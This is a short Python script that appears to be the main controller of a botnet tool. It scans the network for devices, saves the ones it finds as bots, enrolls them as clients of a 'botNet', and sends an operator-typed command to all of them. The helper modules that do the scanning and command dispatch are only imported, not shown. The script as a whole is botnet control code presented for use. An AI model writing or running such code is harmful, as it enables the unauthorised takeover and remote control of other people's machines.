from scan_device import Scanbot
import sys
import re
import os
import socket
import time
from multiprocessing import Process
from rwList import RW
from command import Command
import argparse


listip = Scanbot.scan()

Scanbot.display_result(listip)

RW.saveBot(listip)
botNet = Command.addClient()
order = input("Command:")
Command.botnetCommand(order,botNet)  
